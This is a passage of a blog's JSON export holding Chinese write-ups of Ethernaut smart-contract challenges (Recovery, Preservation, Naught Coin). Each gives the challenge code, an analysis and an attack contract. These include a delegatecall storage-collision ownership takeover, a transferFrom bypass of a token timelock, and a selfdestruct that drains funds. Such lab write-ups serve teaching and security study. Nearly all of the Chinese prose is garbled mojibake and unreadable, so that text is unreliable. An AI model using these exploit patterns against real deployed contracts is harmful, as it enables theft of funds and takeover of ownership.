&#125; // clean up after ourselves function destroy(address payable _to) public &#123; selfdestruct(_to); &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. åˆ†æ#### tipsï¼š [å‚è€ƒåšå®¢](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥ä»åˆçº¦çš„éƒ¨ç½²è€…åœ°å€å’Œæ¥è‡ªéƒ¨ç½²è€…çš„éƒ¨ç½²äº¤æ˜“çš„éšæœºæ•°ä¸­å¾—å‡ºã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ä¸€å¼€å§‹å°±æœ‰è¿™äº›ä¿¡æ¯ï¼š 1. åˆåŒéƒ¨ç½²è€…åœ°å€ï¼ˆæˆ‘ä»¬çš„ä¾‹å­ï¼Œåœ¨æˆ‘çš„ä¾‹å­ä¸­`0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`ï¼‰ 2. éƒ¨ç½²ç¬¬ä¸€ä¸ª SimpleToken çš„éšæœºæ•°ï¼ˆ1 å¦‚ç»ƒä¹ æ‰€è¿°ï¼‰ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾è®¡ç®—å‡ºç¬¬ä¸€ä¸ª SimpleToken éƒ¨ç½²çš„åˆçº¦åœ°å€ï¼Œç»“æœä¸º`0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`. ä»æŠ€æœ¯ä¸Šè®²ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“ä½œå¼Šï¼Œå› ä¸ºé€šè¿‡æ£€æŸ¥å®ä¾‹åˆçº¦çš„å†…éƒ¨äº¤æ˜“ï¼Œå¾ˆå®¹æ˜“åœ¨åŒºå—æµè§ˆå™¨ä¸Šçœ‹åˆ°æˆ‘ä»¬è¦æ’ç©ºçš„åˆçº¦çš„åˆçº¦åœ°å€ã€‚ç„¶è€Œï¼Œç»ƒä¹ çš„ç›®çš„æ˜¯æˆ‘ä»¬è‡ªå·±æ¨å¯¼å‡ºåœ°å€ã€‚ æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨è¦åšçš„å°±æ˜¯è°ƒç”¨`destroy()`SimpleToken åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¹¶å°†å…¶ä¸­çš„èµ„é‡‘å®šå‘åˆ°ä»»ä½•åœ°å€ï¼Œä»¥ä¾¿å°†ç»ƒä¹ æ ‡è®°ä¸ºå·²å®Œæˆã€‚- 2.2 åšæ³•ï¼š- ä¸€æ—¦æˆ‘ä»¬æœ‰äº†è¿™ä¸¤ä¸ªç»†èŠ‚ï¼ˆéƒ¨ç½²åœ°å€ï¼Œéšæœºæ•°ï¼‰ï¼Œå°±åƒæˆ‘åœ¨[è§£å†³æ–¹æ¡ˆ](https://dac.ac/blog/ethernaut_solutions/#solution-15)ä¸­æè¿°çš„é‚£æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ python ä¸­ï¼ˆæˆ–ç›´æ¥åœ¨ solidity ä¸­ï¼‰ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥è·å–åœ°å€ã€‚ä½œä¸ºä¸€ä¸ªè¶³æ™ºå¤šè°‹çš„å¼€å‘äººå‘˜ï¼Œå³ä½¿æˆ‘çŸ¥é“å¦‚ä½•è®¡ç®—å®ƒï¼Œæˆ‘ä»ç„¶å†³å®šå» StackExchange ä¸­æ‰¾åˆ°ä¸€ä¸ªç°æˆçš„è§£å†³æ–¹æ¡ˆä»¥è·³è¿‡è¿™ä¸ªï¼š- ``` js # compute address of a given contract to be deployed from # the deployer address + nonce, as stated in the Section 7 # of the Ethereum yellowpaper for contracts created using CREATE def mk_contract_address(sender: str, nonce: int) -&gt; str: &quot;&quot;&quot;Create a contract address using eth-utils. # Modified from Mikko Ohtamaa&#x27;s original answer which was later # edited by Utgarda # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed &quot;&quot;&quot; sender_bytes = to_bytes(hexstr=sender) raw = rlp.encode([sender_bytes, nonce]) h = keccak(raw) address_bytes = h[12:] return to_checksum_address(address_bytes) ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥è¿™äº›å€¼å¹¶æ‰¾åˆ°ç¬¬ä¸€ä¸ª SimpleToken éƒ¨ç½²çš„åœ°å€ï¼š first_simpletoken_contract_address &#x3D; mk_contract_address(recovery.address, 1) è¿æ¥åˆ°è¿™ä¸ªåˆçº¦å¹¶è°ƒç”¨destroy()å‡½æ•°ï¼Œå°†èµ„é‡‘å‘é€åˆ°æˆ‘çš„åœ°å€ã€‚ simpletoken.destroy(acc.address, _from) æ”»å‡»åˆçº¦æ¥è‡ª å‚è€ƒè§†é¢‘ contract Dev &#123; function recover(address sender) external pure returns (address) &#123; address addr = address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01) )) ))); return addr; &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å®ä¾‹åœ°å€ï¼š0x7802095a90641cd76543bc7df683d24D4bdd4436 3.2 éƒ¨ç½²Devåˆçº¦ï¼Œè°ƒç”¨åˆçº¦ä¸­çš„recover() å‡½æ•°ï¼Œä¼ å…¥çš„å½¢å‚ä¸ºå…³å¡å®ä¾‹ 3.3 å°†è°ƒç”¨recover() å‡½æ•° è¿”å›çš„åœ°å€å¸¦åˆ°åŒºå—é“¾æµè§ˆå™¨ä¸ŠæŸ¥çœ‹äº¤æ˜“ 3.3 ä½¿ç”¨recover() å‡½æ•° è¿”å›çš„åœ°å€è·å–éƒ¨ç½²çš„SimpleTokenåˆçº¦ï¼Œå¹¶å°†è°ƒç”¨SimpleTokenåˆçº¦ä¸­çš„destroy() å‡½æ•°ï¼Œä¼ å…¥çš„å½¢å‚ä¸ºè‡ªå·± çš„é’±åŒ…åœ°å€ 3.4 æ‰§è¡Œdestroy() å‡½æ•°ä¹‹åï¼Œåˆ°åŒºå—é“¾æµè§ˆå™¨ä¸­å†å»æŸ¥çœ‹åœ°å€çš„ä½™é¢ä¸º0 3.5 æäº¤æ¡ˆä¾‹ 3.6 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Preservation","slug":"Smart contracts/ethernaut/Preservation","date":"2023-01-18T09:10:10.000Z","updated":"2023-01-18T09:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Preservation/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Preservation/","excerpt":"","text":"Preservation1.é¢˜ç›®è¦æ±‚ 1.1 è¯¥åˆçº¦åˆ©ç”¨åº“åˆçº¦ä¿å­˜ 2 ä¸ªä¸åŒæ—¶åŒºçš„æ—¶é—´æˆ³ã€‚åˆçº¦çš„æ„é€ å‡½æ•°è¾“å…¥ä¸¤ä¸ªåº“åˆçº¦åœ°å€ç”¨äºä¿å­˜ä¸åŒæ—¶åŒºçš„æ—¶é—´æˆ³ã€‚ é€šå…³æ¡ä»¶ï¼šå°è¯•å–å¾—åˆçº¦çš„æ‰€æœ‰æƒï¼ˆownerï¼‰ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„æ³¨æ„ç‚¹ï¼š æ·±å…¥äº†è§£ Solidity å®˜ç½‘æ–‡æ¡£ä¸­åº•å±‚æ–¹æ³• delegatecall çš„å·¥ä½œåŸç†ï¼Œå®ƒå¦‚ä½•åœ¨é“¾ä¸Šå’Œåº“åˆçº¦ä¸­çš„ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä»¥åŠæ‰§è¡Œçš„ä¸Šä¸‹æ–‡èŒƒå›´ã€‚ ç†è§£ delegatecall çš„ä¸Šä¸‹æ–‡ä¿ç•™çš„å«ä¹‰ ç†è§£åˆçº¦ä¸­çš„å˜é‡æ˜¯å¦‚ä½•å­˜å‚¨å’Œè®¿é—®çš„ ç†è§£ä¸åŒç±»å‹ä¹‹é—´çš„å¦‚ä½•è½¬æ¢ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; &#125; // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 123456789101112131415161718192021222324## 2. åˆ†æ#### [å‚è€ƒæ–‡ç« 1](https://stermi.medium.com/the-ethernaut-challenge-16-solution-preservation-bc2fe5abec4d) [å‚è€ƒæ–‡ç« 2](https://dac.ac/blog/ethernaut_solutions/#delegation)#### ç¬¬ä¸€ç±»åˆ†ææ–¹æ³•- 2.1 ç›®æ ‡ï¼šå£°æ˜å¯¹ç»™å®šå®ä¾‹çš„æ‰€æœ‰æƒ- 2.2 å®ƒæœ‰ä¸€ä¸ª`uint256 storedTime`çŠ¶æ€å˜é‡å’Œä¸€ä¸ª setter å‡½æ•°`setTime`ï¼Œå¯ä»¥æ ¹æ®ç”¨æˆ·çš„è¾“å…¥æ›´æ–°çŠ¶æ€å˜é‡ã€‚- ```solidity // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 2.3 åˆ†æä¸»å‡½æ•°çš„ä»£ç  å®ƒæœ‰äº”ä¸ªä¸åŒçš„çŠ¶æ€å˜é‡ address public timeZone1Libraryç¬¬ä¸€æ—¶åŒºå›¾ä¹¦é¦†åœ°å€ address public timeZone2Libraryç¬¬äºŒæ—¶åŒºå›¾ä¹¦é¦†åœ°å€ address public owneræ‰€æœ‰è€…çš„åœ°å€ uint256 storedTimeä¸¤ä¸ªæ—¶åŒºåº“ä¹‹ä¸€å­˜å‚¨çš„æ—¶é—´ bytes4 constant setTimeSignature``setTimeæ—¶åŒºåº“ä¸­å‡½æ•°çš„ç­¾åã€‚constantç”±äºå…³é”®å­—ï¼Œè¿™ä¸æ˜¯çœŸæ­£çš„çŠ¶æ€å˜é‡ åˆçº¦çš„the constructorof the contract é‡‡ç”¨ä¸¤ç§addressç±»å‹çš„è¾“å…¥æ¥è®¾ç½®ä¸¤ä¸ªåº“åœ°å€å¹¶å°†æ‰€æœ‰è€…è®¾ç½®ä¸ºmsg.sender. ç„¶åæˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸åŒçš„åŠŸèƒ½ function setFirstTime(uint256 _timeStamp) public function setSecondTime(uint256 _timeStamp) public å®ƒä»¬æ˜¯ç›¸åŒçš„ï¼Œå®ƒä»¬åªæ˜¯åœ¨ä¸¤ä¸ªä¸åŒçš„æ—¶åŒºåº“ä¸Šæ‰§è¡Œç›¸åŒçš„ä»£ç  å½“Preservationåˆçº¦æ‰§è¡Œæ—¶setFirstTime(100)ï¼Œå®ƒä¼šè°ƒç”¨LibraryContract.setTime(100)via delegatecallã€‚ æ‰§è¡Œçš„ä»£ç æ¥è‡ªåˆçº¦LibraryContractï¼Œä½†ä½¿ç”¨çš„ä¸Šä¸‹æ–‡æ˜¯æ‰§è¡Œæ“ä½œç çš„ä¸Šä¸‹æ–‡delegatecallã€‚å½“æˆ‘ä»¬è°ˆè®ºä¸Šä¸‹æ–‡æ—¶ï¼Œæˆ‘ä»¬æŒ‡çš„æ˜¯å­˜å‚¨ã€å½“å‰å‘é€è€…( msg.sender) å’Œå½“å‰å€¼( msg.value)ã€‚ å¦‚æœ**LibraryContract**ä¿®æ”¹çŠ¶æ€ï¼Œå®ƒä¸ä¼šä¿®æ”¹è‡ªå·±çš„çŠ¶æ€ï¼Œè€Œæ˜¯ä¿®æ”¹è°ƒç”¨è€…ï¼ˆ**Preservation**ï¼‰çš„çŠ¶æ€ï¼è¿™æ„å‘³ç€å½“LibraryContract.setTimeæ›´æ–°storedTimeçŠ¶æ€å˜é‡æ—¶ï¼Œä¸æ˜¯ä»å®ƒè‡ªå·±çš„åˆçº¦æ›´æ–°å˜é‡ï¼Œè€Œæ˜¯æ›´æ–°è°ƒç”¨è€…åˆçº¦çš„slot0ä¸­çš„å˜é‡ï¼Œå³timeZone1Libraryåœ°å€ã€‚ setSecondTimeæ‰§è¡Œå‡½æ•°æ—¶ä¼šå‘ç”ŸåŒæ ·çš„äº‹æƒ…ï¼Œå®ƒå°†æ›´æ–°åˆçº¦slot0Preservationä¸­çš„å˜é‡ã€‚ æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Ÿæœ‰æ²¡æœ‰åŠæ³•ä¿®æ”¹delegatecallå­˜å‚¨çŠ¶æ€å˜é‡ä¿¡æ¯çš„ç¬¬ä¸‰ä¸ªå­˜å‚¨æ§½ownerï¼Ÿ å¥½å§ï¼Œä¸æ˜¯ç›´æ¥æ¥è‡ªsetFirstTimeï¼Œå¦åˆ™ä¼šä¿®æ”¹slot0setSecondTimeå˜é‡çš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°†slot0åœ°å€æ›¿æ¢ä¸ºæˆ‘ä»¬å·²éƒ¨ç½²çš„åˆçº¦çš„åœ°å€ï¼Œè¿™å°†æ¨¡æ‹Ÿç›¸åŒçš„å¸ƒå±€å­˜å‚¨å¹¶ä¸”ç¡®å®ä¼šæ›´æ–°slot3å˜é‡æ€ä¹ˆåŠï¼Ÿ ç¬¬äºŒç±»åˆ†ææ–¹æ³• ä¿å­˜åˆçº¦ä½¿ç”¨åœ°å€ä¸­åˆ†é…çš„åˆçº¦timeZone1Libraryå’ŒtimeZone2Libraryåº“åˆçº¦ã€‚å› æ­¤ï¼Œå¯¹è¿™äº›åˆçº¦çš„æ‰€æœ‰è°ƒç”¨éƒ½æ˜¯åœ¨ä¿å­˜åˆçº¦ä¸­å®Œæˆçš„delegatecallï¼Œä¸ä¼šè§¦åŠæ¯ä¸ªåˆçº¦çš„å­˜å‚¨LibraryContractï¼Œè€Œæ˜¯è§¦åŠä¿å­˜åˆçº¦çš„å­˜å‚¨ã€‚ å½“æˆ‘ä»¬storedTimeé€šè¿‡åº“åˆçº¦ä¸­çš„å‡½æ•°ä¿®æ”¹å˜é‡æ—¶ï¼Œæˆ‘ä»¬ä¸æ˜¯åœ¨åº“æˆ–ä¿å­˜åˆçº¦ä¸­ä¿®æ”¹delegatecallï¼Œè€Œæ˜¯åœ¨ä¿å­˜åˆçº¦ä¸­å ç”¨ç›¸åº”å­˜å‚¨æ§½çš„å˜é‡ã€‚setTime()``storedTimestoredTime å› æ­¤ï¼Œè°ƒç”¨setFirstTime()orsetSecondTime()å°†timeZone1Libraryä½¿ç”¨æˆ‘ä»¬ä½œä¸º ä¼ é€’çš„ä»»ä½•å€¼è¿›è¡Œä¿®æ”¹_timeStampã€‚å› æ­¤ï¼Œä¸ºäº†åˆ©ç”¨åˆçº¦å¹¶æˆä¸ºownerï¼Œæˆ‘ä»¬éœ€è¦éƒ¨ç½²ä¸€ä¸ªä¸Preservation å…·æœ‰ç›¸åŒå­˜å‚¨å¸ƒå±€çš„åˆçº¦ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ”»å‡»è€…åˆçº¦åº”è¯¥å®šä¹‰ï¼š 123address public timeZone1Library;address public timeZone2Library;address public owner; ä¸ä¿å­˜çš„é¡ºåºå®Œå…¨ç›¸åŒã€‚ æ­¤å¤–ï¼Œæ”»å‡»è€…åˆçº¦ä¸­å¿…é¡»å®šä¹‰ä¸¤ä¸ªé™„åŠ åŠŸèƒ½ï¼š ä¸€ä¸ªsetTime()å¸¦æœ‰uint256å‚æ•°çš„å‡½æ•°ï¼Œåœ¨æ”»å‡»è€…åˆçº¦çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†ä¿®æ”¹å…¶ç¬¬ä¸‰ä¸ªå†…å­˜æ§½ä¸­çš„å˜é‡ï¼Œå› æ­¤ownerã€‚è¿™ä¸ªå˜é‡çš„åç§°æ— å…³ç´§è¦ï¼Œå› ä¸ºæˆ‘ä»¬åªå¯¹ä¿®æ”¹ Preservation ä¸­çš„ç¬¬ 3 ä¸ªå†…å­˜æ§½æ„Ÿå…´è¶£ï¼Œä½†ä¸ºäº†ä¿æŒä¸€è‡´ï¼Œæˆ‘ä¹Ÿå°†å…¶å‘½åä¸ºownerã€‚ 123function setTime(uint256) public &#123; owner = tx.origin;&#125; åœ¨ä¿æŠ¤ä¸­è°ƒç”¨çš„å‡½æ•°setFirstTime()ï¼Œä»¥ä½¿timeZone1Libraryæ”»å‡»è€…ç­¾è®¢åˆåŒã€‚å¦‚æœæ¯ä¸ª LibraryContract éƒ½ä½¿ç”¨ä¸ Preservation ç›¸åŒçš„å¸ƒå±€è¿›è¡Œæ­£ç¡®ç¼–ç ï¼Œåˆ™ Preservation åˆçº¦ä¸ä¼šä»¥è¿™ç§æ–¹å¼å—åˆ°æ”»å‡»ã€‚ 123function setFirstTimeExploit() external &#123; preservationContract.setFirstTime(uint256(address(this)));&#125; preservationContractä¿å­˜åˆåŒçš„æ¥å£åœ¨å“ªé‡Œã€‚ å› æ­¤æµç¨‹å¦‚ä¸‹ï¼š é€šè¿‡ä»æ”»å‡»è€…åˆçº¦è°ƒç”¨æ¥åˆ›å»ºæ”»å‡»è€…åˆçº¦timeZone1Libraryåœ°å€setFirstTime()ã€‚ ä½¿ç”¨setFirstTime()ä»»ä½•æ— ç¬¦å·æ•´æ•°ä½œä¸ºå‚æ•°è°ƒç”¨ä¿å­˜åˆçº¦ï¼Œè¯¥åˆçº¦setTime()åœ¨æ”»å‡»è€…åˆçº¦ä¸­æ‰§è¡Œï¼Œç”Ÿæˆowneræˆ‘ä»¬çš„åŸå§‹åœ°å€ã€‚ å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ contract Hack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; function attack(Preservation target) external &#123; target.setFirstTime(uint256(uint160(address(this)))); target.setFirstTime(uint256(uint160(msg.sender))); require(target.owner() == msg.sender, &quot;hack failed&quot;); &#125; function setTime(uint _owner) external &#123; owner = address(uint160(_owner)); &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x5E4d571ae5dAA2A4D530a1a5B89C11d6fEae8440 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œè°ƒç”¨Hack åˆçº¦ä¸­çš„attack() å‡½æ•°ï¼Œå½¢å‚æ˜¯å®ä¾‹åœ°å€ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Naught Coin","slug":"Smart contracts/ethernaut/Naught Coin","date":"2023-01-18T07:10:10.000Z","updated":"2023-01-18T07:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Naught Coin/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Naught%20Coin/","excerpt":"","text":"Naught Coin1. é¢˜ç›®è¦æ±‚ 1.1 NaughtCoin æ˜¯ä¸€ç§ ERC20 ä»£å¸ï¼Œè€Œä¸”æ‚¨å·²ç»æŒæœ‰è¿™äº›ä»£å¸ã€‚é—®é¢˜æ˜¯æ‚¨åªèƒ½åœ¨ 10 å¹´ä¹‹åæ‰èƒ½è½¬ç§»å®ƒä»¬ã€‚æ‚¨èƒ½å°è¯•å°†å®ƒä»¬è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è‡ªç”±ä½¿ç”¨å®ƒä»¬å—ï¼Ÿé€šè¿‡å°†æ‚¨çš„ä»£å¸ä½™é¢å˜ä¸º 0 æ¥å®Œæˆæ­¤å…³å¡ã€‚ è¿™å¯èƒ½æœ‰ç”¨ ERC20æ ‡å‡† OpenZeppelinä»“åº“ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &#39;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&#39;; contract NaughtCoin is ERC20 &#123; // string public constant name = &#39;NaughtCoin&#39;; // string public constant symbol = &#39;0x0&#39;; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123; player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(block.timestamp &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; 1234567891011121314151617181920212223242526## 2. åˆ†æ- 2.1 é€šè¿‡è®©æ‚¨çš„ä»£å¸ä½™é¢ä¸º 0 æ¥å®Œæˆæ­¤çº§åˆ«- 2.2 ***tipsï¼š\\****åœ¨*`*constructor*`*.* `*_mint*`*åœ¨æ‰§è¡Œåˆçº¦*`*emit*`*äº‹ä»¶**å*`*Transfer*`*ï¼Œä¸çŸ¥é“ OpenZeppelin*`*_mint*`*å‡½æ•°çš„æœ¬æœºå®ç°å·²ç»æ˜¯*`*emit*`*äº‹ä»¶*`*Transfer*`- è¦è§£å†³è¿™ä¸ªåˆçº¦ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ ERC20 ä»£å¸çš„ EIPï¼ˆä»¥å¤ªåŠæ”¹è¿›ææ¡ˆï¼‰æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä»¥åŠ OpenZeppelin æ˜¯å¦‚ä½•å®ç°å®ƒçš„ï¼ˆè¯¥åˆçº¦ä½¿ç”¨çš„æ˜¯ OpenZeppelin æ¡†æ¶åº“ï¼‰ã€‚ æ‚¨å¯ä»¥ä»è¿™äº›é“¾æ¥ä¸­æ‰¾åˆ°æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼š - [ä»¥å¤ªåŠ EIP-20](https://eips.ethereum.org/EIPS/eip-20) - [OpenZeppelin ERC20 æ–‡æ¡£](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20) - [OpenZeppelin ERC20 å®ç°](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol) è½¬ç§»ä»£å¸æœ‰ä¸¤ç§æ–¹å¼ï¼š - é€šè¿‡`transfer`å…è®¸`msg.sender`ç›´æ¥å°†ä»£å¸è½¬ç§»åˆ°`recipient` - é€šè¿‡`transferFrom`å…è®¸å¤–éƒ¨ä»»æ„`sender`ï¼ˆå¯èƒ½æ˜¯ä»£å¸æœ¬èº«çš„æ‰€æœ‰è€…ï¼‰ä»£è¡¨æ‰€æœ‰è€…å°†`amount`ä»£å¸è½¬ç§»åˆ°`recipient`. åœ¨å‘é€è¿™äº›ä»£å¸ä¹‹å‰ï¼Œæ‰€æœ‰è€…å¿…é¡»å·²**æ‰¹å‡†**ç®¡ç†`sender`è¯¥æ•°é‡çš„ä»£å¸ å› ä¸º`transfer`æ–¹æ³•å·²ç»`overrided`çº¦å®šå¥½äº†`NaughtCoin`ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡½æ•°æ¥è§„é¿é™åˆ¶`transferFrom`ã€‚ è¿™æ˜¯æˆ‘ä»¬éœ€è¦åšçš„ï¼š 1) åˆ›å»ºä¸€ä¸ªäºŒçº§è´¦æˆ·ï¼Œå°†æˆ‘ä»¬æ‰€æœ‰çš„ä»£å¸è½¬ç§»åˆ° 2) åœ¨è°ƒç”¨ä¹‹å‰æ‰¹å‡†æˆ‘ä»¬è‡ªå·±ç®¡ç†å…¨éƒ¨ä»£å¸`transferFrom`3) è°ƒç”¨`transferFrom(player, secondaryAccount, token.balanceOf(player))`4) éšå¿ƒæ‰€æ¬²åœ°ä½¿ç”¨ä»£å¸ï¼ NaughtCoin`åˆçº¦åº”è¯¥å®æ–½ä»€ä¹ˆæ‰èƒ½çœŸæ­£é”å®šæˆ‘ä»¬çš„ä»£å¸**10 å¹´**ï¼Ÿä»–ä»¬å¯ä»¥å®ç°EIP-20 å®šä¹‰çš„**ä¸€ä¸ªæŒ‚é’©**`overriding`ï¼Œç§°ä¸º.`transfer``_beforeTokenTransfer 12345678910111213141516171819202122232425 å½“å‘ç”Ÿä»»ä½•ç±»å‹çš„ä»¤ç‰Œä¼ è¾“æ—¶ï¼Œå°†è°ƒç”¨æ­¤æŒ‚é’©ï¼š - `mint`ï¼ˆä»åœ°å€è½¬ç§»`0x`åˆ°ç”¨æˆ·ï¼‰ - `burn`ï¼ˆä»ç”¨æˆ·è½¬ç§»åˆ°`0x`åœ°å€ï¼‰ - `transfer` - `transferFrom` é€šè¿‡è¿™æ ·åšï¼Œä»–ä»¬å¯ä»¥é˜²æ­¢è¿™ç§åˆ©ç”¨ã€‚- 2.3 [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=f4QDmG2Cgc0) å†™çš„æ”»å‡»åˆçº¦- ```solidity interface INaughtCoin &#123; function player() external view returns (address); &#125; contract Hack &#123; function pwn(IERC20 coin) external &#123; address player = INaughtCoin(address(coin)).player(); uint bal = coin.balanceOf(player); coin.transferFrom(player, address(this), bal); &#125; &#125; 2.4 è§£é¢˜æ­¥éª¤ä¸ºï¼š // 1.Deploy // 2.coin.approve(hack, amount) // 3.pwn() 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x34df3070B62B46bCBc4d0a2cbCcd670109041b8a 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ Hack 3.3 æ ¹æ®å…³å¡å®ä¾‹åœ°å€ ç”Ÿæˆ IECR20 åˆçº¦ 3.4 è°ƒç”¨IECR20 åˆçº¦ä¸­çš„balanceOf() å‡½æ•°æŸ¥çœ‹å½“å‰è´¦æˆ·ä½™é¢ 3.5 å†è°ƒç”¨IECR20 åˆçº¦çš„approve() å‡½æ•°ï¼Œä¼ å…¥Hack åˆçº¦åœ°å€å’Œ æ‰€æŸ¥è´¦æˆ·ä½™é¢ 3.6 è°ƒç”¨Hack åˆçº¦ä¸­çš„pwn() å‡½æ•° ä¼ å…¥å…³å¡å®ä¾‹ 3.7 å›åˆ°IECR20 åˆçº¦ä¸­è°ƒç”¨balanceOf() å‡½æ•°æŸ¥çœ‹å½“å‰è´¦æˆ·ä½™é¢ 3.8 æäº¤å®ä¾‹ 3.9 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Gatekeeper Two","slug":"Smart contracts/ethernaut/GatekeeperTwo","date":"2023-01-09T05:02:15.000Z","updated":"2023-01-09T05:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/GatekeeperTwo/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/GatekeeperTwo/","excerpt":"","text":"Gatekeeper Two1. é¢˜ç›®è¦æ±‚ 1.1 é¢˜ç›®ï¼šè¿™ä¸ªå®ˆé—¨äººå¸¦æ¥äº†ä¸€äº›æ–°çš„æŒ‘æˆ˜, åŒæ ·çš„éœ€è¦æ³¨å†Œä¸ºå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³ è¿™å¯èƒ½æœ‰å¸®åŠ©: æƒ³ä¸€æƒ³ä½ 